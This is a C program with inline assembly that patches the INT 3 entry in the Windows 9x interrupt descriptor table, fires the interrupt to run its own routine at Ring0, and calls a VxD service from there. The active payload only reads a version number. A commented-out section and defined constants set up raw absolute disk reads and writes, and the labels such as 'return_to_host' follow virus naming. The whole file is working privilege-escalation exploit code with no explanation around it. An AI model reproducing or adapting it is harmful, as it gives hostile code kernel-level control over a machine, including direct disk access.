#include <stdio.h>

//#pragma optimize("", off)	//disable optimization for the inline asm
//void VxDCall();
//extern "C" void VxDCall();	//issues VxD Win32-Services

#define	IFSMgr_Ring0_FileIO	0x00400032
#define	R0_READABSOLUTEDISK	0xDD00	/* Absolute disk read */
#define	R0_WRITEABSOLUTEDISK	0xDE00	/* Absolute disk write */

#define exception_int	3
typedef	unsigned char	byte;
typedef	unsigned long	dword;

byte buff[1024];
dword reg;

void main()
{
	dword IDT_Address[2];
	dword exception_;
	dword SEH_nextpointer;
	dword SEH_oldpointer;
	dword SEH_errorhandler;
	dword old_offset;

//	IDT_Address[0]=0;
//	IDT_Address[1]=0;

	asm {
	jmp	realstart

ring:
	pushad
/*	mov	eax,R0_READABSOLUTEDISK
	mov	ecx,1
	mov	edx,1
	mov	esi,dword ptr buff
	int	0x20
	dd	IFSMgr_Ring0_FileIO
	mov	[reg],eax*/
//	mov	dword ptr [reg],1

	int	0x20
	dd	0x002a0000	//VWin32_Get_Version = 0x002A0000
	mov	word ptr [reg],ax
	popad
	iretd

realstart:
	mov	eax,dword ptr fs:[00H]			// get the old seh pointer
	mov	dword ptr [SEH_nextpointer],eax		// set in structure
	mov	dword ptr [SEH_oldpointer],eax		// and save for restore
	lea	eax,[return_to_host]			// make it point here...
	mov	dword ptr [SEH_errorhandler],eax
	lea	eax,[SEH_nextpointer]
	mov	dword ptr fs:[00H],eax			// and point the structure

	sidt	qword ptr [IDT_Address]			// Get interrupt address
	mov	esi,dword ptr [IDT_Address+2]		// (first 2 are the length)
	add	esi,exception_int*8			// get the offset for Int
	mov	dword ptr [exception_],esi		// save exception place
	mov	bx,word ptr [esi+6]			// get low word
	shl	ebx,0x10				// shift left
	mov	bx,word ptr [esi]			// get high word
	mov	dword ptr [old_offset],ebx		// save exception offset
//	lea	eax,[offset Ring0]			// eax=new Int handler
//	mov	eax,offset Ring0			// eax=new Int handler
	mov	eax,offset ring
	mov	word ptr [esi],ax			// store high word
	shr	eax,0x10				// shift right
	mov	word ptr [esi+6],ax			// and store low word

go_on_to_ring0:
	int	exception_int				// Generate exception -> Ring0 !

already_installed:
	mov	esi,dword ptr [exception_]		// restore IDT address
	mov	ebx,dword ptr [old_offset]		// restore exception offset
	mov	word ptr [esi],bx			// restore exception
	shr	ebx,0x10				// handler
	mov	word ptr [esi+6],bx

return_to_host:
	mov	eax,dword ptr [SEH_oldpointer]		// restore the old SEH pointer
	mov	dword ptr fs:[00H],eax
	}

	printf("%x,%x\n", IDT_Address[0], IDT_Address[1]);
	printf("%x\n", reg);
	printf("%s\n", buff);
}
